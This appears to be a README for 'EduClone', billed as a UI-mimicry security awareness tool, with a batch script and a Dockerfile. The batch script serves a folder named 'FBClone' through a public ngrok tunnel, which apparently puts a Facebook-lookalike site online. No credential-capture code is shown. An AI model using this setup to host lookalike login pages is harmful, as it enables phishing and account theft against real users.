# Project Title: EduClone - UI Security Awareness Prototype

## Overview
EduClone is a web application designed for educational purposes, focusing on raising awareness about UI mimicry and associated security risks. This project aims to help developers and cybersecurity enthusiasts learn about the potential dangers of account impersonation through similar-looking interfaces. EduClone highlights the importance of online vigilance and ethical cybersecurity practices, providing users with insights on enhancing security measures. **Note**: This project is solely intended as a learning tool to promote responsible cybersecurity knowledge.

---

## Batch Script for Running the Server
To start the EduClone server and create a secure tunnel, use the following `.bat` file script:

```batch
@echo off
start /min cmd /k "cd /d %USERPROFILE%\Desktop\FBClone && npm start"
start /min cmd /k "ngrok http --url=humane-newt-formally.ngrok-free.app 3000"
```

---

## Dockerfile for EduClone
To containerize EduClone for convenient deployment, use the Docker configuration below. Adjust as needed:

```dockerfile
# Use a lightweight Node.js image
FROM node:slim

# Skip Puppeteer's Chromium download if not required
ENV PUPPETEER_SKIP_CHROMIUM_DOWNLOAD true

# Install Google Chrome and necessary fonts for Puppeteer compatibility
RUN apt-get update && apt-get install gnupg wget -y && \
    wget --quiet --output-document=- https://dl-ssl.google.com/linux/linux_signing_key.pub | gpg --dearmor > /etc/apt/trusted.gpg.d/google-archive.gpg && \
    sh -c 'echo "deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main" >> /etc/apt/sources.list.d/google.list' && \
    apt-get update && \
    apt-get install google-chrome-stable -y --no-install-recommends && \
    rm -rf /var/lib/apt/lists/*

# Set the working directory and install dependencies
WORKDIR /edu_clone
COPY package*.json ./
RUN npm ci
COPY . .

# Expose the application port
EXPOSE 3000

# Define the command to run the application
CMD [ "node", "app.js" ]
```
